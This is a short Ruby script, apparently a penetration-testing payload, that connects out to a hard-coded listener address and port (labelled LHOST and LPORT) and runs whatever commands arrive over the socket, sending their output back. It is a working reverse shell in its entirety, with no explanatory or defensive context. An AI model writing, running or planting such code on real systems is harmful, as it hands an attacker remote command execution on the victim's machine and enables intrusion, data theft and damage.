require 'socket'
require 'open3'

host = '10.0.1.35' # Change to match LHOST
port = 4444            # Change to match LPORT

socket = TCPSocket.new(host, port)

while true
  socket.print "> "
  command = socket.gets.chomp
  break if command == "exit"

  output, _ = Open3.capture2e(command)
  socket.puts output
end

socket.close
